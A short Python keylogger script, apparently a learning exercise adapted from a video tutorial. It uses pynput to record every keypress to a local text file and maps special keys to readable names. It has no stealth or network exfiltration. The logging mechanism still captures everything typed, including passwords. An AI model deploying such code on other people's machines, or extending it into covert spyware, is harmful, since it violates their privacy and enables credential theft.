#Base code from 'https://www.youtube.com/watch?v=mDY3v2Xx-Q4'

#From the pynput library importing the keyboard monitor
from pynput import keyboard

#Creating a function that passes a certain key as an argument
def keypressed(key):
    #Records the certain key pressed
    print(str(key))

    #A dictionary to be referenced to in order to record special keys pressed
    key_dict = {'Key.space': 'Space Bar', 'Key.cmd': 'Command (left)', 'Key.alt': 'alt/option (left)',
            'Key.ctrl': 'Control', '<179>': 'fn', 'Key.shift': 'Shift (left)', 'Key.caps_lock': 'Caps Lock',
            'Key.tab': 'Tab (left)', '<160>': 'f3', '<131>': 'f4', 'Key.media_play_pause': 'Play Pause',
            'Key.media_volume_mute': 'Mute', 'Key.media_volume_down': 'Volume Down', 'Key.media_volume_up': 'Volume Up',
            '<127>': 'Power', 'Key.backspace': 'Delete', 'Key.enter': 'Enter', 'Key.shift_r': 'Shift (right)',
            'Key.up': 'Up Arrow', 'Key.down': 'Down Arrow', 'Key.right': 'Right Arrow', 'Key.left': 'Left Arrow',
            'Key.alt_r': 'alt/option (right)', 'Key.cmd_r': 'Command (right)', 'Key.esc': 'Esc'}

    #Start writing the records to a text file using the 'append' parameter
    with open("keyfile.txt", 'a') as logkey:
        #Actually logging the clicked keys to the file

        #Checking to see if the key pressed belongs on the key_dict and writes to file if so
        if str(key) in key_dict:
            logkey.write(key_dict[str(key)]+'\n')
            print()
        
        #Writes non 'special' keys to keyfile.txt
        else:
            char = key.char
            logkey.write(char+'\n')
            print()

#Starts the listener that interprets the keys pressed and calls the created function
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
